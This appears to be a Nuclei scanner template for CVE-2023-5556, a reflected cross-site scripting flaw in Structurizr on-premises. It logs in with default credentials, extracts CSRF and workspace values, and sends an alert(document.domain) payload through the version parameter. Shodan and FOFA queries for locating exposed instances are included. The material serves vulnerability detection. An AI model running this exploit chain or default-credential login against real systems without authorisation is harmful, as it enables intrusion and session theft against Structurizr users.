http:
- attack: pitchfork
  extractors:
  - group: 1
    internal: true
    name: csrf
    regex:
    - name="_csrf" value="([0-9a-z-]+)"
    type: regex
  - group: 1
    internal: true
    name: workspace
    part: header
    regex:
    - \/workspace\/([0-9]+)\?scriptNonce=
    type: regex
  matchers:
  - condition: and
    part: body_3
    type: word
    words:
    - <a href="/dashboard">
    - Sign out
  - condition: and
    part: body_5
    type: word
    words:
    - '");alert(document.domain);//'
    - Structurizr
  - status:
    - 200
    type: status
  matchers-condition: and
  payloads:
    password:
    - password
    username:
    - structurizr
  raw:
  - 'GET /signin HTTP/1.1

    Host: {{Hostname}}

    '
  - 'POST /login HTTP/1.1

    Host: {{Hostname}}

    Origin: {{RootURL}}

    Content-Type: application/x-www-form-urlencoded


    username={{username}}&password={{password}}&_csrf={{csrf}}&hash=

    '
  - 'GET /dashboard HTTP/1.1

    Host: {{Hostname}}

    Content-Type: application/x-www-form-urlencoded

    '
  - 'GET /workspace/create HTTP/1.1

    Host: {{Hostname}}

    '
  - 'GET /workspace/{{workspace}}/?version={{str}}%22);alert(document.domain);// HTTP/1.1

    Host: {{Hostname}}

    '
id: CVE-2023-5556
info:
  author: shankaracharya
  classification:
    cpe: cpe:2.3:a:structurizr:on-premises_installation:*:*:*:*:*:*:*:*
    cve-id: CVE-2023-5556
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N
    cvss-score: 6.1
    cwe-id: CWE-79
    epss-percentile: 0.96272
    epss-score: 0.27733
  description: 'Cross-site Scripting (XSS) - Reflected in GitHub repository structurizr/onpremises
    prior to 3194.

    '
  impact: 'Authenticated attackers can inject malicious JavaScript through the version
    parameter in workspace URLs to steal user session tokens and execute attacks against
    Structurizr users.

    '
  metadata:
    fofa-query: icon_hash=1199592666
    max-request: 5
    product: on-premises_installation
    shodan-query: http.favicon.hash:1199592666
    vendor: structurizr
  name: Structurizr on-premises - Cross Site Scripting
  reference:
  - https://huntr.com/bounties/a3ee0f98-6898-41ae-b1bd-242a03a73d1b/
  - https://github.com/structurizr/onpremises/commit/6cff4f792b010dfb1ff6a0b4ae1c6e398f8f8a18
  - https://github.com/fkie-cad/nvd-json-data-feeds
  remediation: 'Apply the latest security patches or updates provided by Structurizr
    to fix the XSS vulnerability.

    '
  severity: medium
  tags: cve,cve2023,xss,structurizr,oos,authenticated,vuln
variables:
  str: '{{randstr}}'
